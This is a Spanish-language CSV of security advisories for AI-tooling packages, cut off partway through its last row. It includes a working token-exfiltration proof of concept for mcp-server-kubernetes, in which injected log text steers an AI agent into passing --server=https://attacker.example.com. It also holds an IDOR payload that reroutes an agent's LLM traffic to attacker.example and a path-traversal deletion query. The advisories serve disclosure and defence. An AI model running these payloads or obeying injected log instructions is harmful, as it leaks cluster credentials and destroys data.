@@ -1,0 +1,1703 @@
+﻿"avidId","cveId","slug","sourceUrl","titleEs","descriptionEs","fullText","severity","cvssScore","cvssVersion","cvssVector","attackVector","attackComplexity","privilegesRequired","userInteraction","scope","confidentialityImpact","integrityImpact","availabilityImpact","cweId","cweDescription","developer","products","vulnerableVersionRange","firstPatchedVersion","riskDomain","reportClass","reportType","reportedDate","publishedAt","credit","references","country","lat","lng","company"
+"GHSA-6mx4-4h42-r8vh","CVE-2026-47250","inyeccion-flags-mcp-server-kubernetes-permite-exfiltracion-tokens","https://github.com/advisories/GHSA-6mx4-4h42-r8vh","Inyección de flags en MCP Server Kubernetes permite exfiltración de tokens bearer de Kubernetes","Vulnerabilidad de escalada de privilegios en mcp-server-kubernetes que permite a atacantes con acceso limitado al cluster exfiltrar tokens bearer de operadores privilegiados mediante inyección de flags en kubectl_generic, comprometiendo credenciales RBAC completas.","## Resumen
+
+La herramienta `kubectl_generic` en `mcp-server-kubernetes` pasa flags suministrados por el usuario directamente a kubectl sin ninguna lista de permitidos, habilitando un **ataque de escalada de privilegios** dentro de entornos Kubernetes. Un atacante que ya tiene acceso limitado al cluster o al código base, por ejemplo, un desarrollador con permisos de despliegue de pods pero sin credenciales de cluster-admin, puede plantar una sola línea JSON estructurada en la salida de logs de una aplicación. Cuando un operador con un kubeconfig privilegiado usa el servidor MCP para leer esos logs y su agente de IA sigue la instrucción inyectada, `kubectl_generic` es llamado con `--server=https://attacker.example.com` y `--insecure-skip-tls-verify=true`. kubectl envía todas las peticiones de API, incluyendo el header `Authorization: Bearer <token>` del kubeconfig del operador al endpoint del atacante. El token capturado puede entonces ser reproducido directamente contra el servidor real de la API de Kubernetes, otorgando al atacante los permisos RBAC completos de la cuenta de servicio del operador.
+
+El mecanismo de exfiltración de tokens fue confirmado end-to-end sin requerir cluster. La cadena completa de ataque incluyendo inyección indirecta de prompts vía logs reales de pods fue adicionalmente confirmada usando un cluster kind en vivo y Claude Haiku (API de Anthropic) como agente.
+
+## Detalles
+
+### Código vulnerable
+
+`src/tools/kubectl-generic.ts`, líneas 103-118:
+
+```typescript
+if (input.flags) {
+  for (const [key, value] of Object.entries(input.flags)) {
+    if (value === true) {
+      cmdArgs.push(`--${key}`);
+    } else if (value !== false && value !== null && value !== undefined) {
+      cmdArgs.push(`--${key}=${value}`);   // ← sin lista de permitidos; cualquier flag de kubectl aceptado
+    }
+  }
+}
+
+if (input.args && input.args.length > 0) {
+  cmdArgs.push(...input.args);             // ← también sin restricciones
+}
+```
+
+Tanto el objeto `flags` como el array `args` son pasados literalmente a `execFileSync(""kubectl"", cmdArgs)`.
+
+### Por qué se necesitan dos flags
+
+kubectl deliberadamente suprime headers `Authorization: Bearer` sobre conexiones HTTP planas (una característica de seguridad contra filtración en texto claro). El ataque por tanto requiere dos flags juntos:
+
+| Flag | Propósito |
+|------|----------|
+| `--server=https://attacker.com` | Redirige llamadas de API de kubectl al endpoint del atacante |
+| `--insecure-skip-tls-verify=true` | Permite certificado auto-firmado del atacante; activa envío de credenciales |
+
+Ambos son flags estándar de depuración de kubectl usados cuando se conecta a clusters con certificados auto-firmados, haciendo que el payload de inyección parezca plausible.
+
+## Prueba de Concepto
+
+### Paso 1 - Verificación estática
+
+```bash
+# Confirmar que el bucle de flags no tiene lista de permitidos:
+grep -A 8 ""for.*Object.entries.*flags"" src/tools/kubectl-generic.ts
+```
+
+La salida esperada muestra `cmdArgs.push(--${key}=${value})` sin verificación de lista de permitidos.
+
+### Paso 2 - Prueba de comportamiento de kubectl (confirma que HTTPS es requerido)
+
+```bash
+# Iniciar un listener HTTPS mínimo con certificado auto-firmado:
+openssl req -x509 -newkey rsa:2048 -nodes -keyout /tmp/k.pem -out /tmp/c.pem \
+  -subj ""/CN=test"" -days 1 2>/dev/null
+
+python3 - <<'EOF'
+import ssl, threading, json
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class H(BaseHTTPRequestHandler):
+    def log_message(self, *a): pass
+    def do_GET(self):
+        print(f""Authorization: {self.headers.get('authorization','<none>')}"") 
+        self.send_response(401); self.end_headers()
+
+srv = HTTPServer((""127.0.0.1"", 19001), H)
+ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+ctx.load_cert_chain(""/tmp/c.pem"", ""/tmp/k.pem"")
+srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
+t = __import__(""threading"").Thread(target=srv.serve_forever, daemon=True); t.start()
+
+import subprocess, time; time.sleep(0.3)
+subprocess.run([
+    ""kubectl"", ""get"", ""pods"",
+    ""--server=https://127.0.0.1:19001"",
+    ""--token=MY-TEST-TOKEN-DOES-THIS-ARRIVE"",
+    ""--insecure-skip-tls-verify=true""
+], capture_output=True)
+time.sleep(0.3)
+EOF
+```
+
+Salida esperada:
+```
+Authorization: Bearer MY-TEST-TOKEN-DOES-THIS-ARRIVE
+```
+
+Esto confirma: kubectl envía el token bearer a cualquier endpoint HTTPS cuando ambos flags están presentes.
+
+### Paso 3 - Exfiltración de token vía llamada de herramienta MCP
+
+**Prerrequisitos:** Node.js 18+, Python 3.10+, `openssl` en PATH.
+
+```bash
+git clone https://github.com/Flux159/mcp-server-kubernetes
+cd mcp-server-kubernetes
+npm install && npm run build
+```
+
+Copiar y ejecutar el siguiente script autocontenido desde dentro del repositorio:
+
+```python
+#!/usr/bin/env python3
+""""""
+PoC: inyección de flags kubectl_generic → exfiltración de token bearer.
+Ejecutar desde dentro del repositorio mcp-server-kubernetes después de `npm run build`.
+""""""
+import json, os, ssl, subprocess, sys, tempfile, threading, time
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+KNOWN_TOKEN  = ""EXFIL-CONFIRM-THIS-TOKEN-12345""
+ATTACKER_PORT = 19001
+captured = []
+
+# ── Servidor HTTPS atacante ───────────────────────────────────────────
+class Attacker(BaseHTTPRequestHandler):
+    def log_message(self, *_): pass
+    def _handle(self):
+        auth = self.headers.get(""authorization"", """")
+        if auth: captured.append(auth); print(f""  CAPTURADO: {auth}"", flush=True)
+        body = b'{""code"":401}'; self.send_response(401)
+        self.send_header(""Content-Length"", str(len(body))); self.end_headers()
+        self.wfile.write(body)
+    def do_GET(self): self._handle()
+    def do_POST(self): self._handle()
+
+tmpdir = tempfile.mkdtemp()
+cert, key = f""{tmpdir}/c.pem"", f""{tmpdir}/k.pem""
+subprocess.run([""openssl"",""req"",""-x509"",""-newkey"",""rsa:2048"",""-nodes"",
+    ""-keyout"",key,""-out"",cert,""-subj"",""/CN=attacker"",""-days"",""1""],
+    capture_output=True, check=True)
+srv = ThreadingHTTPServer((""127.0.0.1"", ATTACKER_PORT), Attacker)
+ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain(cert, key)
+srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
+threading.Thread(target=srv.serve_forever, daemon=True).start()
+
+# ── kubeconfig falso con token conocido ──────────────────────────────
+kubeconfig = f""""""apiVersion: v1
+kind: Config
+clusters:
+- cluster:
+    server: https://fake-cluster.internal:6443
+    insecure-skip-tls-verify: true
+  name: poc
+contexts:
+- context:
+    cluster: poc
+    user: poc-user
+  name: poc
+current-context: poc
+users:
+- name: poc-user
+  user:
+    token: {KNOWN_TOKEN}
+""""""
+
+# ── Iniciar mcp-server-kubernetes ────────────────────────────────────
+proc = subprocess.Popen(
+    [""node"", ""dist/index.js""],
+    stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+    env={**os.environ, ""KUBECONFIG_YAML"": kubeconfig}
+)
+time.sleep(2)
+if proc.poll() is not None:
+    print(""Servidor falló al iniciar:"", proc.stderr.read().decode()[:300]); sys.exit(1)
+
+def send(msg):
+    proc.stdin.write((json.dumps(msg)+""\n"").encode()); proc.stdin.flush()
+
+def recv(timeout=15):
+    import time as _t; deadline = _t.time()+timeout
+    while _t.time() < deadline:
+        line = proc.stdout.readline()
+        if line:
+            try: return json.loads(line)
+            except: pass
+        time.sleep(0.05)
+
+# Handshake MCP
+send({""jsonrpc"":""2.0"",""id"":1,""method"":""initialize"",
+      ""params"":{""protocolVersion"":""2024-11-05"",""capabilities"":{},
+                ""clientInfo"":{""name"":""poc"",""version"":""0""}}})
+recv()
+send({""jsonrpc"":""2.0"",""method"":""notifications/initialized"",""params"":{}})
+time.sleep(0.3)
+
+# ── LA LLAMADA DE ATAQUE ────────────────────────────────────────────────
+print(f""\nLlamando kubectl_generic con --server=https://127.0.0.1:{ATTACKER_PORT}"")
+print(""kubectl enviará Authorization: Bearer al servidor HTTPS atacante\n"")
+
+send({""jsonrpc"":""2.0"",""id"":2,""method"":""tools/call"",
+      ""params"":{""name"":""kubectl_generic"",
+                ""arguments"":{""command"":""get"",""resourceType"":""pods"",
+                             ""flags"":{""server"":f""https://127.0.0.1:{ATTACKER_PORT}"",
+                                      ""insecure-skip-tls-verify"":""true""}}}})
+recv(timeout=20)
+time.sleep(1)
+proc.terminate(); srv.shutdown()
+
+# ── Resultado ─────────────────────────────────────────────────────────
+print()
+if any(KNOWN_TOKEN in c for c in captured):
+    print(""PASÓ: token bearer exfiltrado vía inyección de flags kubectl_generic"")
+    print(f""  Token inyectado: {KNOWN_TOKEN}"")
+    print(f""  Capturado:       {captured[0]}"")
+else:
+    print(""NO CONFIRMADO - ver salida arriba"")
+    sys.exit(1)
+```
+
+Salida esperada:
+```
+Llamando kubectl_generic con --server=https://127.0.0.1:19001
+kubectl enviará Authorization: Bearer al servidor HTTPS atacante
+
+  CAPTURADO: Bearer EXFIL-CONFIRM-THIS-TOKEN-12345
+
+PASÓ: token bearer exfiltrado vía inyección de flags kubectl_generic
+  Token inyectado: EXFIL-CONFIRM-THIS-TOKEN-12345
+  Capturado:       Bearer EXFIL-CONFIRM-THIS-TOKEN-12345
+```
+
+## Impacto
+
+**Lo que logra un atacante:** Escalada de privilegios dentro de un entorno donde el atacante ya tiene acceso limitado al cluster o código base. El token bearer de Kubernetes del kubeconfig del operador es entregado al servidor HTTPS del atacante en la primera petición de descubrimiento de API de kubectl. El token otorga cualquier RBAC que tenga la cuenta de servicio, en un despliegue típico de gestión de cluster, esto tiene alcance amplio. El atacante reproduce el token capturado directamente contra la API real de Kubernetes, independiente del servidor MCP.","MEDIUM","6.1","3.1","CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N","Network","High","None","Required","Changed","High","None","None","CWE-88","Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')","npm","mcp-server-kubernetes","<= 3.6.2","3.7.0","Security","Security Advisory","Advisory","2026-06-05","2026-06-07T09:24:02.850Z","yotampe-pluto","https://github.com/Flux159/mcp-server-kubernetes/security/advisories/GHSA-6mx4-4h42-r8vh;https://github.com/Flux159/mcp-server-kubernetes/releases/tag/v3.7.0;https://github.com/advisories/GHSA-6mx4-4h42-r8vh","XX","0","0","Flux159"
+"GHSA-7p8g-6c6g-h9w7","CVE-2026-47419","idor-praisonaiplatform-permite-acceso-crossworkspace-agentes-validacion-propiedad","https://github.com/advisories/GHSA-7p8g-6c6g-h9w7","IDOR en praisonai-platform permite acceso cross-workspace a agentes sin validacion de propiedad","Vulnerabilidad IDOR en endpoints CRUD de agentes permite a usuarios autenticados leer, modificar y eliminar agentes de otros workspaces mediante manipulacion de agent_id. Severidad alta CVSS 8.1.","## Resumen
+
+**Tipo:** Insecure Direct Object Reference (IDOR). Los endpoints CRUD de agentes (`GET / PATCH / DELETE /workspaces/{workspace_id}/agents/{agent_id}`) controlan el acceso únicamente mediante `require_workspace_member(workspace_id)`, luego resuelven `agent_id` a través de `AgentService.get(agent_id)` que es una búsqueda por clave primaria sin restricción de workspace. Un usuario miembro de cualquier workspace `W1` puede leer, modificar o eliminar agentes que pertenecen a un workspace diferente `W2` adivinando o recolectando un UUID de agente y llamando `.../workspaces/W1/agents/<W2-agent-id>`.
+
+**Archivo:** `src/praisonai-platform/praisonai_platform/services/agent_service.py`, líneas 53-112; manejadores de rutas en `src/praisonai-platform/praisonai_platform/api/routes/agents.py`, líneas 53-100.
+
+**Causa raíz:** la ruta extrae `workspace_id` del path URL y lo pasa a `require_workspace_member` para la verificación de membresía, pero nunca lo transmite a la capa de servicio. `AgentService.get` llama `session.get(Agent, agent_id)`, que es `SELECT * FROM agents WHERE id = :agent_id` sin `AND workspace_id = :workspace_id`. Los métodos `update` y `delete` llaman primero `self.get(agent_id)` y luego mutan la fila devuelta, heredando la misma brecha. El `MemberService` es el único lugar en este código que lo hace correctamente: usa `(workspace_id, user_id)` como clave compuesta. El servicio de agentes simplemente olvidó el segundo predicado, que es el patrón textbook GHSA para servicios FastAPI que tratan los parámetros de enrutamiento como decorativos en lugar de autoritativos.
+
+## Código Afectado
+
+**Archivo 1:** `src/praisonai-platform/praisonai_platform/services/agent_service.py`, líneas 53-55 y 105-112.
+
+```python
+class AgentService:
+    ...
+
+    async def get(self, agent_id: str) -> Optional[Agent]:
+        """"""Get agent by ID.""""""
+        return await self._session.get(Agent, agent_id)            # <-- BUG: sin predicado workspace_id
+
+    async def update(
+        self,
+        agent_id: str,
+        name: Optional[str] = None,
+        ...
+    ) -> Optional[Agent]:
+        agent = await self.get(agent_id)                           # <-- hereda la misma brecha
+        if agent is None:
+            return None
+        ...
+        return agent
+
+    async def delete(self, agent_id: str) -> bool:
+        agent = await self.get(agent_id)                           # <-- hereda la misma brecha
+        if agent is None:
+            return False
+        await self._session.delete(agent)
+        await self._session.flush()
+        return True
+```
+
+**Archivo 2:** `src/praisonai-platform/praisonai_platform/api/routes/agents.py`, líneas 53-101.
+
+```python
+@router.get(""/{agent_id}"", response_model=AgentResponse)
+async def get_agent(
+    workspace_id: str,
+    agent_id: str,
+    user: AuthIdentity = Depends(require_workspace_member),         # solo verifica membresía en workspace_id
+    session: AsyncSession = Depends(get_db),
+):
+    svc = AgentService(session)
+    agent = await svc.get(agent_id)                                 # <-- workspace_id nunca pasado; svc.get devuelve cualquier agente en la BD
+    if agent is None:
+        raise HTTPException(status_code=404, detail=""Agent not found"")
+    return AgentResponse.model_validate(agent)
+```
+
+Los manejadores `update_agent` (líneas 67-87) y `delete_agent` (líneas 90-100) exhiben el mismo patrón: reciben `workspace_id` vía parámetro de path, lo usan únicamente para la puerta de membresía, luego llaman `svc.update(agent_id, ...)` / `svc.delete(agent_id)` sin re-verificar a qué workspace pertenece realmente el agente.
+
+**Por qué está mal:** el segmento `workspace_id` en la ruta se trata como una pista de UI (controla ""¿estás en algún workspace W?"") en lugar de un predicado autoritativo (también debería controlar ""¿el recurso que estás direccionando está realmente dentro de W?""). Una corrección estándar en servicios FastAPI/SQLAlchemy es hacer que la consulta de búsqueda de recursos incluya el predicado de workspace y tratar la ausencia como 404, para que un agente de workspace foráneo sea indistinguible de uno inexistente.
+
+## Cadena de Explotación
+
+1. El atacante registra dos cuentas (o recluta un miembro de workspace) y crea dos workspaces: `W_attacker` (el atacante es miembro) y obtiene un `agent_id` conocido de `W_target` (un workspace del cual el atacante NO es miembro). Los IDs de agente son strings uuid4 (default de columna BD), pero se filtran a través de varios canales laterales: endpoints de lista de usuarios cuando un agente se menciona en el cuerpo de un issue, el feed de actividad (`activity.py:log` registra `entity_id=agent.id`), payloads de webhook, mensajes de error, dumps de issues exportados, o simplemente por enumeración si el despliegue no rota IDs frecuentemente.
+
+2. El atacante se autentica y hace POST `Authorization: Bearer <attacker_jwt>` a `GET /workspaces/W_attacker/agents/A_T`. `require_workspace_member(W_attacker, attacker)` devuelve la identidad del atacante (son miembro de `W_attacker`). El flujo de control entra en `get_agent` con `workspace_id=W_attacker`, `agent_id=A_T`.
+
+3. `AgentService.get(A_T)` ejecuta `session.get(Agent, ""A_T"")`, que es `SELECT * FROM agents WHERE id = 'A_T' LIMIT 1`. La consulta no tiene filtro `workspace_id = 'W_attacker'` y devuelve la fila, incluyendo sus `instructions`, `runtime_config`, `name`, `status`, `owner_id`, etc, aunque `agent.workspace_id == 'W_target'`. El cuerpo de respuesta es el agente objetivo serializado en JSON.
+
+4. El atacante repite con `PATCH /workspaces/W_attacker/agents/A_T` y un cuerpo de `{""instructions"": ""<prompt de sistema malicioso>"", ""runtime_mode"": ""cloud"", ""runtime_config"": {""api_base"": ""https://attacker.example/v1"", ""api_key"": ""<exfil>""}}`. `update_agent` llama `svc.update(A_T, ...)` que carga la fila objetivo y muta los campos listados. El agente del workspace foráneo ahora tiene instrucciones elegidas por el atacante y enruta su tráfico LLM a través de `attacker.example`.
+
+5. El atacante llama `DELETE /workspaces/W_attacker/agents/A_T` para eliminar completamente el agente objetivo, o repite el paso 4 contra cada UUID de agente que pueda recolectar. La flota de agentes del workspace objetivo es destruida o comprometida con backdoors.
+
+## Impacto de Seguridad
+
+**Severidad:** sec-high. CVSS 8.1: ataque de red, baja complejidad, bajos privilegios (cualquier miembro de workspace autenticado), sin interacción de usuario, alcance sin cambios (el contexto de autenticación es el mismo componente), alta confidencialidad (registro completo de agente incluyendo instrucciones y configuración de runtime), alta integridad (escrituras arbitrarias), baja disponibilidad (DELETE elimina agentes objetivo).
+
+**Capacidad del atacante:** con un token de miembro de workspace más un UUID de agente recolectado o adivinado, un atacante puede leer las `instructions` del agente objetivo (frecuentemente un prompt de sistema propietario), `runtime_config` (frecuentemente contiene URLs de proveedores LLM y claves API cuando el despliegue usa BYOK), `owner_id`, y estado; reescribir los mismos campos para redirigir el tráfico LLM del agente a un endpoint controlado por el atacante (proxy-y-log de cada prompt, inyección de prompt de cada respuesta); cambiar `status` a `error` para romper silenciosamente la flota de agentes de un workspace competidor; o eliminar los agentes completamente.
+
+**Precondiciones:** `praisonai-platform` está desplegado multi-tenant (existe más de un workspace); el atacante tiene cualquier token de membresía; el UUID del agente objetivo es conocido o adivinable (la aleatoriedad uuid4 es grande pero los UUIDs se filtran a través de feeds de actividad, payloads de webhook, menciones de issues, mensajes de error, y capturas de pantalla del operador).
+
+## Corrección Sugerida
+
+Hacer que cada búsqueda de recurso de fila única tome el predicado de workspace. Tratar filas de workspace foráneo como 404, no 200, para que el endpoint ni siquiera confirme que el ID objetivo existe.
+
+```diff
+--- a/src/praisonai-platform/praisonai_platform/services/agent_service.py
++++ b/src/praisonai-platform/praisonai_platform/services/agent_service.py
+@@ -50,9 +50,12 @@ class AgentService:
+         await self._session.flush()
+         return agent
+ 
+-    async def get(self, agent_id: str) -> Optional[Agent]:
+-        """"""Get agent by ID.""""""
+-        return await self._session.get(Agent, agent_id)
++    async def get(self, workspace_id: str, agent_id: str) -> Optional[Agent]:
++        """"""Get agent by ID, scoped to a workspace.""""""
++        stmt = select(Agent).where(
++            Agent.id == agent_id, Agent.workspace_id == workspace_id
++        )
++        return (await self._session.execute(stmt)).scalar_one_or_none()
+```
+
+Los manejadores de rutas en `routes/agents.py` entonces necesitan pasar `workspace_id` a cada llamada `svc.get/update/delete`. Repetir el patrón para `IssueService`, `ProjectService`, `CommentService`, y `LabelService`, que exhiben la misma búsqueda de clave única.","HIGH","8.3","3.1","CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L","Network","Low","Low","None","Unchanged","High","High","Low","CWE-639","Authorization Bypass Through User-Controlled Key","pip","praisonai-platform","< 0.1.4","0.1.4","Security","Security Advisory","Advisory","2026-06-05","2026-06-10T20:25:39.917Z","offset, 0xEr3n","https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-7p8g-6c6g-h9w7;https://github.com/advisories/GHSA-7p8g-6c6g-h9w7","XX","0","0","PraisonAI"
+"GHSA-3ww4-5jv9-j5gm","CVE-2026-47155","vulnerabilidad-integridad-vllm-permite-carga-artefactos-fijados-despliegues","https://github.com/advisories/GHSA-3ww4-5jv9-j5gm","Vulnerabilidad de integridad en vLLM permite carga de artefactos no fijados en despliegues con revision","vLLM no aplica consistentemente los controles de fijación de revisión a todos los artefactos cargados. Los despliegues con --revision pueden cargar código dinámico, archivos GGUF, procesadores de imagen y pesos desde revisiones no fijadas, comprometiendo la integridad de la cadena de suministro en despliegues con revisión fijada.","## Resumen
+
+vLLM presenta una vulnerabilidad de integridad en la cadena de suministro que afecta a los controles de fijación de revisión. Los despliegues que especifican `--revision` o `--code-revision` pueden seguir cargando código dinámico, archivos GGUF, procesadores de imagen, pesos de recuperación lateral o pesos/configuración de subcarpetas del mismo repositorio desde una revisión no fijada o por defecto.
+
+Esta es una vulnerabilidad de integridad de la cadena de suministro para despliegues vLLM con revisión fijada. Los operadores pueden creer que están sirviendo una revisión de modelo revisada mientras vLLM resuelve artefactos anidados o hermanos que afectan el comportamiento fuera de esa revisión revisada.
+
+## Detalles Técnicos
+
+La invariante esperada es que cuando un operador vLLM proporciona una fijación de modelo o revisión de código, cada archivo de código, configuración, procesador, peso, peso lateral y artefacto de subcarpeta del mismo repositorio cargado como parte de ese modelo debe resolverse bajo esa fijación, a menos que vLLM exponga y haga cumplir una fijación explícita separada para ese artefacto.
+
+La rama `main` actual fue verificada como afectada en el commit `3795d7acf431980e62e738493f437ae2a51549da`.
+
+### Límites de Código Afectados
+
+Los puntos vulnerables identificados incluyen:
+
+- `vllm/model_executor/models/registry.py:1045-1051` y `:1058-1064`: `_try_resolve_transformers()` pasa `revision=model_config.revision` y `trust_remote_code=model_config.trust_remote_code`, pero omite `code_revision=model_config.code_revision` para importaciones de módulos dinámicos `auto_map` externos.
+
+- `vllm/model_executor/model_loader/gguf_loader.py:58-60`: La forma GGUF de archivo directo `repo/file.gguf` llama a `hf_hub_download(repo_id=repo_id, filename=filename)` sin pasar `revision`.
+
+- `vllm/model_executor/models/roberta.py:203-209`: Los pesos laterales secundarios sparse y ColBERT de BGE-M3 se declaran con `revision=None`.
+
+- `vllm/model_executor/models/kimi_k25.py:111-114`: Kimi-K2.5 llama a `cached_get_image_processor()` sin pasar `model_config.revision`.
+
+- `vllm/model_executor/models/kimi_audio.py:92-95` y `:425-430`: Kimi-Audio carga configuración de Whisper desde la subcarpeta `whisper-large-v3` sin argumento `revision` y declara pesos secundarios del mismo repositorio con `revision=None`.
+
+El ejemplo más claro es Kimi-Audio: los pesos primarios de `moonshotai/Kimi-Audio-7B-Instruct` preservan la revisión del modelo configurada, pero la configuración/pesos de la torre de audio `whisper-large-v3` del mismo repositorio no lo hacen.
+
+## Impacto
+
+Los usuarios afectados son operadores que fijan despliegues de modelos vLLM a una revisión revisada de Hugging Face para revisión de seguridad, procedencia, rollback o reproducibilidad. El impacto es que la fijación no describe de manera confiable el conjunto completo de artefactos que vLLM sirve.
+
+Incluso cuando el operador selecciona una revisión auditada, vLLM puede resolver artefactos secundarios que afectan el comportamiento desde la rama por defecto del repositorio u otra referencia mutable. Dependiendo de la ruta del modelo, el artefacto no fijado puede ser código de modelo dinámico, un archivo GGUF, un procesador de imagen, pesos laterales de recuperación o los pesos/configuración de la subcarpeta Whisper de Kimi-Audio del mismo repositorio.
+
+Esto rompe la garantía operacional de un despliegue fijado: ""servir el conjunto exacto de artefactos que revisé"". Un cambio posterior a un artefacto secundario no fijado puede alterar el comportamiento del modelo sin cambiar la revisión configurada del operador, haciendo que la revisión, rollback, respuesta a incidentes y registros de auditoría sean poco confiables.
+
+## Casos de Ocurrencia
+
+Las instancias específicas incluyen:
+
+- Kimi-K2.5 carga su procesador de imagen sin pasar la revisión del modelo
+- Kimi-Audio declara pesos secundarios Whisper con `revision=None`
+- La carga de configuración Whisper sin pasar la revisión del modelo de nivel superior
+- Resolución de clase de modelo dinámico que omite `code_revision`
+- Forma GGUF directa que no pasa `model_config.revision`
+- Creación de fuentes de pesos laterales con `revision=None` en BgeM3EmbeddingModel
+
+## Corrección
+
+Esta vulnerabilidad fue corregida en: https://github.com/vllm-project/vllm/pull/42616
+
+El reporte fue originalmente presentado vía huntr y redirigido al canal privado GHSA por el mantenedor de vLLM. Un paquete de prueba offline está disponible bajo solicitud para verificación.","MEDIUM","6.5","3.1","CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N","Network","High","None","None","Unchanged","Low","High","None","CWE-345","Insufficient Verification of Data Authenticity","pip","vllm","< 0.22.0","0.22.0","Security","Security Advisory","Advisory","2026-06-10","2026-06-11T22:20:35.387Z","addcontent, russellb, jperezdealgaba","https://github.com/vllm-project/vllm/security/advisories/GHSA-3ww4-5jv9-j5gm;https://github.com/advisories/GHSA-3ww4-5jv9-j5gm","US","0","0","vLLM"
+"GHSA-8q5r-mmjf-575q","CVE-2026-47751","rce-claude-code-action-configuracion-mcp-maliciosa-prs","https://github.com/advisories/GHSA-8q5r-mmjf-575q","RCE en Claude Code Action por configuracion MCP maliciosa en PRs afecta a repositorios GitHub","Vulnerabilidad en claude-code-action permite ejecucion remota de codigo y exfiltracion de secretos mediante archivos .mcp.json maliciosos en pull requests. Afecta repositorios que usan esta accion de GitHub.","## Vulnerabilidad de Ejecucion Remota de Codigo en Claude Code Action
+
+Se ha identificado una vulnerabilidad critica en claude-code-action que permite a atacantes ejecutar codigo arbitrario en runners de GitHub Actions mediante la manipulacion de archivos de configuracion MCP.
+
+## Mecanismo de Explotacion
+
+La vulnerabilidad surge de la combinacion de tres factores tecnicos:
+
+1. **Checkout de ramas PR controladas por atacantes**: La accion procesa automaticamente el contenido de pull requests, incluyendo ramas creadas por usuarios potencialmente maliciosos
+
+2. **Lectura de configuracion desde directorio de trabajo**: El sistema lee archivos `.mcp.json` directamente desde el directorio de trabajo utilizando fuentes de configuracion por defecto
+
+3. **Habilitacion incondicional de servidores MCP**: La configuracion `enableAllProjectMcpServers` activa automaticamente todos los servidores MCP del proyecto sin validacion
+
+## Vector de Ataque
+
+Un atacante puede explotar esta vulnerabilidad siguiendo estos pasos:
+
+1. Crear un pull request contra un repositorio que utilice claude-code-action
+2. Incluir un archivo `.mcp.json` malicioso en el PR
+3. Esperar a que un usuario privilegiado active la accion Claude en el PR o que se ejecute automaticamente
+4. Lograr ejecucion arbitraria de codigo en el runner de GitHub Actions
+
+## Impacto de Seguridad
+
+La explotacion exitosa de esta vulnerabilidad puede resultar en:
+
+- **Ejecucion remota de codigo**: Control completo del entorno de ejecucion de GitHub Actions
+- **Exfiltracion de secretos**: Acceso a claves API, tokens y otras credenciales disponibles en el workflow
+- **Compromiso de la cadena de suministro**: Potencial para inyectar codigo malicioso en procesos de CI/CD
+
+## Condiciones de Explotacion
+
+Para que la vulnerabilidad sea explotable se requiere:
+
+- Capacidad para abrir pull requests contra el repositorio objetivo
+- Uso de claude-code-action en el repositorio
+- Activacion de la accion por parte de un usuario privilegiado o trigger automatico
+
+## Mitigacion y Recomendaciones
+
+Los usuarios que tengan versiones vulnerables fijadas de claude-code-action deben actualizar inmediatamente a la version mas reciente. Los usuarios que referencien `anthropics/claude-code-action@v1`, `anthropics/claude-code-action@beta`, `anthropics/claude-code-action@main` u otras etiquetas no fijadas ya habran recibido la correccion automaticamente.
+
+## Reconocimientos
+
+Claude Code agradece a hackerone.com/reptou por reportar esta vulnerabilidad de manera responsable.","MEDIUM","","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","CWE-78","Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')","actions","anthropics/claude-code-action","< 1.0.74","1.0.74","Security","Security Advisory","Advisory","2026-06-10","2026-06-15T07:52:10.045Z","","https://github.com/anthropics/claude-code-action/security/advisories/GHSA-8q5r-mmjf-575q;https://github.com/advisories/GHSA-8q5r-mmjf-575q","US","37.77","-122.42","Anthropic"
+"GHSA-j9rx-rppg-6hh4","CVE-2026-47253","vulnerabilidad-path-traversal-anyquery-permite-eliminacion-arbitraria-directorios","https://github.com/advisories/GHSA-j9rx-rppg-6hh4","Vulnerabilidad de Path Traversal en Anyquery permite eliminacion arbitraria de directorios via clear_plugin_cache","La funcion SQL clear_plugin_cache en Anyquery 0.4.4 permite a atacantes autenticados eliminar directorios arbitrarios del sistema mediante path traversal, causando perdida de datos y denegacion de servicio fuera del directorio cache previsto.","## Resumen
+
+La función SQL escalar `clear_plugin_cache(plugin)` en `namespace/other_functions.go` pasa el argumento `plugin` proporcionado por el usuario directamente a `path.Join` y luego a `os.RemoveAll`, con solo una verificación de cadena vacía como protección. Debido a que `path.Join` resuelve silenciosamente los segmentos `..`, un portador de token con bajos privilegios puede enviar `SELECT clear_plugin_cache('../../../../tmp/target')` al endpoint HTTP `/v1/query` y eliminar cualquier directorio accesible por el proceso del servidor. En el escenario verificado, un directorio fuera de `$XDG_CACHE_HOME/anyquery/plugins/` fue eliminado exitosamente, confirmando la explotación completa de path traversal.
+
+## Código Afectado
+
+`namespace/other_functions.go:46`: `pathlib.Join` resuelve segmentos `..` en el `plugin` controlado por el atacante, produciendo una ruta fuera de la raíz del cache.
+
+`namespace/other_functions.go:53`: `os.RemoveAll` elimina incondicionalmente la ruta atravesada.
+
+```go
+func clear_plugin_cache(plugin string) string {
+	pathToRemove := pathlib.Join(xdg.CacheHome, ""anyquery"", ""plugins"", plugin)
+
+	if plugin == """" {
+		return ""The plugin name is empty""
+	}
+
+	// Remove the directory
+	err := os.RemoveAll(pathToRemove)
+	if err != nil {
+		return err.Error()
+	}
+
+	return """"
+}
+```
+
+Flujo de ejecución: HTTP JSON `body.Query` → `executeQueryLLM` (`controller/llm.go:420-426`) → `shell.Run` → SQLite `clear_plugin_cache(plugin)` → `pathlib.Join(xdg.CacheHome, ""anyquery"", ""plugins"", plugin)` en `other_functions.go:46` → `os.RemoveAll` en `other_functions.go:53`
+
+## Prueba de Concepto
+
+**Prerrequisitos:**
+- Docker instalado
+- Python 3 con paquete `requests` (`pip install requests`)
+
+**Paso 1: Construir e iniciar el servicio vulnerable:**
+
+```bash
+docker build -f Dockerfile -t anyquery-vuln002 .
